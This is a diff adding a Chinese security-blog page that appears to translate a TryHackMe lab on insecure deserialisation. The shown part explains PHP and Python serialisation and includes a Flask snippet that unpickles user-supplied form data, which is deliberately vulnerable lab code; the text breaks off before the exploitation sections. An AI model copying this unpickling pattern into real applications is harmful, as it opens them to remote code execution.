@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场概述难度：描述：  基本信息   🚀 本地机器信息 目标机器信息    IP 10.17.5.121    OS kali     介绍用户提供的输入一直是漏洞的催化剂，在众多平台和应用程序中构成持续威胁。利用用户输入（从 SQL 注入到跨站点脚本）是保护 Web 应用程序的一个众所周知的挑战。另一个与用户输入相关的不太为人知但同样危险的漏洞是不安全的反序列化。   当应用程序足够信任序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不安全的反序列化">
+<meta property="og:url" content="https://imli.ink/2024/12/03/insecuredeserialisation/index.html">
+<meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
+<meta property="og:description" content="靶场概述难度：描述：  基本信息   🚀 本地机器信息 目标机器信息    IP 10.17.5.121    OS kali     介绍用户提供的输入一直是漏洞的催化剂，在众多平台和应用程序中构成持续威胁。利用用户输入（从 SQL 注入到跨站点脚本）是保护 Web 应用程序的一个众所周知的挑战。另一个与用户输入相关的不太为人知但同样危险的漏洞是不安全的反序列化。   当应用程序足够信任序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png">
+<meta property="article:published_time" content="2024-12-03T09:51:11.606Z">
+<meta property="article:modified_time" content="2024-12-03T09:51:11.606Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>不安全的反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3YLDTM3C61"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-3YLDTM3C61');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="安全杂谈 | 网络安全、渗透测试、信息安全技术分享" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/12/04/how_to_info_gather/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/12/01/inferno/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/12/03/insecuredeserialisation/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/12/03/insecuredeserialisation/&text=不安全的反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/12/03/insecuredeserialisation/&is_video=false&description=不安全的反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=不安全的反序列化&body=Check out this article: https://imli.ink/2024/12/03/insecuredeserialisation/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/12/03/insecuredeserialisation/&name=不安全的反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/12/03/insecuredeserialisation/&t=不安全的反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E6%A6%82%E5%BF%B5"><span class="toc-number">4.</span> <span class="toc-text">一些重要概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">序列化格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E5%AE%9A"><span class="toc-number">6.</span> <span class="toc-text">鉴定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E6%9B%B4%E6%96%B0%E5%B1%9E%E6%80%A7"><span class="toc-number">7.</span> <span class="toc-text">利用 - 更新属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">利用 - 对象注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">自动化脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">10.</span> <span class="toc-text">缓解措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        不安全的反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-03T09:51:11.606Z" class="dt-published" itemprop="datePublished">2024-12-03</time>
+        
+        (Updated: <time datetime="2024-12-03T09:51:11.606Z" class="dt-updated" itemprop="dateModified">2024-12-03</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+</blockquote>
+<h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度：<br>描述：</p>
+<hr>
+<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th>🚀</th>
+<th>本地机器信息</th>
+<th>目标机器信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP</td>
+<td>10.17.5.121</td>
+<td></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>kali</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>用户提供的输入一直是漏洞的催化剂，在众多平台和应用程序中构成持续威胁。利用用户输入（从 SQL 注入到跨站点脚本）是保护 Web 应用程序的一个众所周知的挑战。另一个与用户输入相关的不太为人知但同样危险的漏洞是<strong>不安全的反序列化</strong>。  </p>
+<p>当应用程序足够信任序列化数据以使用它而不验证其真实性时，就会发生不安全的反序列化漏洞。这种信任可能会导致灾难性的后果，因为攻击者会操纵序列化对象来实现远程代码执行、提升权限或发起拒绝服务攻击。这种类型的漏洞在各种编程环境（如 Java、.NET 和 PHP）中序列化和反序列化复杂数据结构的应用程序中普遍存在，这些环境通常使用序列化进行远程过程调用、会话管理等。  </p>
+<p>学习目标</p>
+<p>在整个课程中，您将全面了解以下关键概念：</p>
+<ul>
+<li><p>序列化和反序列化过程的工作原理  </p>
+</li>
+<li><p>Web 应用程序的潜在风险</p>
+</li>
+<li><p>开发技术</p>
+</li>
+<li><p>缓解措施</p>
+</li>
+</ul>
+<p>学习先决条件</p>
+<p>在开始聊天室之前，建议了解以下主题：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/howwebsiteswork">网站如何运作</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/protocolsandservers">协议和服务器</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/owasptop10">OWASP 公司前 10 名</a></li>
+</ul>
+<p>连接到本机</p>
+<p>您可以通过单击此任务中附带的按钮来启动虚拟机。我们稍后在会议室中使用易受攻击的应用程序来实际执行练习并熟悉各种攻击媒介。请在系统完全启动后等待 1-2 分钟，以让自动脚本成功运行。</p>
+<p>让我们开始吧！</p>
+<h2 id="一些重要概念"><a href="#一些重要概念" class="headerlink" title="一些重要概念"></a>一些重要概念</h2><p>在详细讨论不安全反序列化之前，通过一个简单的例子来理解基本概念是至关重要的。  </p>
+<p>序列化</p>
+<p>想想序列化，就像早上收拾书包一样。你有书、笔记本、午餐盒和水瓶，你需要把它们整理进包里。序列化就像获取不同的信息（如笔记）并将它们放在一起，以便于存储或发送给朋友。<br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png" alt="image.png"></a></p>
+<p>在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，这些格式可以在需要时存储或传输和重建。在必须在系统的不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序）中，此功能至关重要。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$noteArray</span> = <span class="keyword">array</span>(<span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;My THM Note&quot;</span>, <span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;Welcome to THM!&quot;</span>); <span class="variable">$serialisedNote</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$noteArray</span>); <span class="comment">// Converting the note into a storable format file_put_contents(&#x27;note.txt&#x27;, $serialisedNote); // Saving the serialised note to a file ?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>以下输出显示文件中的序列化字符串，其中包括注释的结构和内容的详细信息。它的存储方式可以轻松保存或传输。<code>note.txt</code></p>
+<p><strong>序列号注释</strong>：<code>a:2:&#123;s:5:&quot;title&quot;;s:12:&quot;My THM Note&quot;;s:7:&quot;content&quot;;s:12:&quot;Welcome to THM!&quot;;&#125;</code></p>
+<p>反序列化</p>
+<p>想象一下，你到达学校，需要你今天早上打包的所有东西。反序列化就像你上课时打开书包;您取出每件物品，以便您可以全天使用。当您打开包包去拿书和午餐时，反序列化会获取打包的数据并将其转换回您可以使用的数据。反序列化是将格式化数据转换回对象的过程。它对于从文件、数据库或跨网络检索数据，将其恢复到其原始状态以供应用程序使用至关重要。</p>
+<p>按照我们前面的例子，以下是如何在 PHP 中反序列化 note 数据：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$serialisedNote</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;note.txt&#x27;</span>);  <span class="comment">// Reading the serialised note from the file</span></span><br><span class="line"><span class="variable">$noteArray</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialisedNote</span>);  <span class="comment">// Converting the serialised string back into a PHP array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Title: &quot;</span> . <span class="variable">$noteArray</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Content: &quot;</span> . <span class="variable">$noteArray</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此代码从文件中读取序列化的注释并将其转换回数组，从而有效地重建原始注释。讨论序列化还需要进行有关安全性的对话。就像您不希望有人篡改您的书包一样，不安全的反序列化可能会导致软件应用程序出现重大安全漏洞。攻击者可能会更改序列化对象以执行未经授权的操作或窃取数据。</p>
+<p>涉及序列化漏洞的特定事件</p>
+<p>让我们讨论一下序列化漏洞在网络安全漏洞或攻击中发挥关键作用的具体事件，强调安全序列化实践的重要性。这些示例说明了攻击者如何利用序列化缺陷来实现远程代码执行、数据泄露等。</p>
+<p><strong>Log4j 漏洞 CVE-2021-44228</strong>  </p>
+<ul>
+<li><strong>事件</strong>：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">Log4j 漏洞</a>或 Log4Shell 是在 Apache Log4j 2 库（Java 应用程序中广泛使用的日志记录库）中发现的一个严重安全漏洞。该漏洞允许远程攻击者通过利用库的不安全反序列化功能在受影响的系统上执行任意代码。如果您想了解有关此漏洞的更多信息，请查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/solar">Solar 利用 log4j</a> 房间。</li>
+<li><strong>冲击：</strong> 该漏洞促进了远程代码执行，使攻击者能够在受影响的系统上执行任意命令。这允许攻击者破坏关键基础设施，从而导致未经授权访问敏感数据、服务中断和潜在的供应链攻击。</li>
+</ul>
+<p><strong>WebLogic Server 远程代码执行 CVE-2015-4852</strong></p>
+<ul>
+<li><strong>事件</strong>：此漏洞与 <a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/alert-cve-2015-4852.html">Oracle WebLogic Server</a> 反序列化数据发送到 T3 协议的方式有关。攻击者可以向服务器发送恶意制作的对象，当反序列化时，会导致远程代码执行。</li>
+<li><strong>影响</strong>：此漏洞被广泛利用，用于未经授权访问系统、部署勒索软件或窃取数据。它影响了未禁用易受攻击的服务或修补问题的所有 WebLogic Server 版本。</li>
+</ul>
+<p><strong>Jenkins Java 反序列化 CVE-2016-0792</strong></p>
+<ul>
+<li><strong>事件</strong>：<a target="_blank" rel="noopener" href="https://www.tenable.com/plugins/nessus/89034">Jenkins</a> 是软件开发中使用的一种常用自动化服务器，它遇到了一个涉及 Java 反序列化的严重漏洞。攻击者可以将构建的序列化有效负载发送到 Jenkins CLI，当反序列化时，该 CLI 可能允许执行任意代码。</li>
+<li><strong>影响</strong>：这允许攻击者执行 shell 命令，从而可能接管 Jenkins 服务器，该服务器通常可以广泛访问软件开发环境，包括源代码、构建系统和可能的部署环境。</li>
+</ul>
+<h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但基本原则是一致的。众所周知，序列化是将对象的状态转换为可以轻松存储或传输的格式，然后在以后重建的过程。无论是 Java、Python、.NET 还是 PHP，每种语言都实施序列化以适应其环境固有的特定功能或安全措施。<a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png" title="different serialisation methods in different languages" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png" alt="different serialisation methods in different languages"></a></p>
+<p>与其他利用用户输入的即时处理的常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次交互，通常会操纵其组件的基本行为。  </p>
+<p>现在，让我们探索一下如何在不同语言中显式处理序列化，探索其功能、语法和独特特性。</p>
+<p>PHP序列化</p>
+<p>在 PHP 中，序列化是使用函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包括各种数据类型，例如字符串、数组和对象，使其唯一。为了说明这一点，让我们考虑一个 notes 应用程序，用户可以在其中保存和检索他们的 notes。我们将创建一个名为 <strong>Notes</strong> 的 PHP 类来表示每个注释并处理序列化和反序列化。<code>serialize()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Notescontent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Notescontent = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我们的 Notes 应用程序中，当用户保存笔记时，我们使用 PHP 的函数序列化 Notes 类对象。这会将对象转换为可以存储在文件或数据库中的字符串表示形式。让我们看一下以下序列化 Notes 类对象的代码片段：<code>serialize()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$note</span> = <span class="keyword">new</span> <span class="title class_">Notes</span>(<span class="string">&quot;Welcome to THM&quot;</span>);</span><br><span class="line"><span class="variable">$serialized_note</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$note</span>);</span><br></pre></td></tr></table></figure>
+
+<p>访问链接并输入任何字符串以序列化或反序列化。例如，如果您输入字符串 <strong>Welcome to THM</strong>，它将生成如下所示的输出：<code>http://10.10.133.158/phptest/``O:5:&quot;Notes&quot;:1:&#123;s:7:&quot;content&quot;;s:14:&quot;Welcome to THM&quot;;&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png" title="notes app in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png" alt="notes app in PHP"></a></p>
+<p>让我们解码输出：</p>
+<ul>
+<li><code>O:5:&quot;Notes&quot;:1:</code>：这部分表示序列化数据表示 <strong>Notes</strong> 类的对象，该类具有一个属性。</li>
+<li><code>s:7:&quot;content&quot;</code>：表示长度为 7 个字符的属性名称 “<strong>content</strong>”。在序列化数据中，字符串用 后跟字符串的长度和双引号中的字符串表示。整数表示，后跟不带引号的数值。<code>s``i</code></li>
+<li><code>s:14:&quot;Welcome to THM&quot;</code>：这是 <strong>content</strong> 属性的值，长度为 14 个字符。</li>
+</ul>
+<p>神奇的方法</p>
+<p>PHP 提供了几种<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.oop5.magic.php">神奇的方法</a>，它们在序列化过程中起着至关重要的作用。下面提到了一些重要的方法：<a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png" title="unserialise pre-req in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png" alt="unserialise pre-req in PHP"></a></p>
+<ul>
+<li><code>__sleep()</code>：此方法在序列化之前对对象调用。它可以清理资源，例如数据库连接，并期望返回应序列化的属性名称数组。</li>
+<li><code>__wakeup()</code>：该方法在反序列化时调用。它可以重新建立对象可能需要正常运行的任何连接。</li>
+<li><code>__serialize()</code>：从 PHP 7.4 开始，此方法允许你通过返回一个表示对象的序列化形式的数组来自定义序列化数据。</li>
+<li><code>__unserialize()</code>：此对应项允许从对象的序列化数据中自定义对象的恢复。<code>__serialize()</code></li>
+</ul>
+<p>python</p>
+<p>Python 使用一个名为 <strong>Pickle</strong> 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件中或通过网络传输。Pickling 是 Python 开发人员的强大工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 中遵循与 PHP 中相同的 notes 应用程序。以下是该类的代码片段：<code>app.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">serialized_data = request.form[<span class="string">&#x27;serialized_data&#x27;</span>]</span><br><span class="line">notes_obj = pickle.loads(base64.b64decode(serialized_data))</span><br><span class="line">message = <span class="string">&quot;Notes successfully unpickled.&quot;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        content = request.form[<span class="string">&#x27;note_content&#x27;</span>]</span><br><span class="line">        notes_obj.add_note(content)</span><br><span class="line">        pickled_content = pickle.dumps(notes_obj)</span><br><span class="line">        serialized_data = base64.b64encode(pickled_content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        binary_data = <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;x:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pickled_content)</span><br><span class="line">        message = <span class="string">&quot;Notes pickled successfully.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>酸洗工艺</strong></p>
+<ul>
+<li><strong>创建 Notes 类</strong>：此类管理注释列表。它提供了添加注释和检索所有注释的方法，从而可以轻松管理应用程序的状态。</li>
+<li><strong>序列化 （Pickling）：</strong>当用户提交注释时，Notes 类实例（包括所有注释）将使用 .此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。<code>pickle.dumps()</code></li>
+</ul>
+<p><strong>显示序列化数据 （base64 编码）</strong></p>
+<ul>
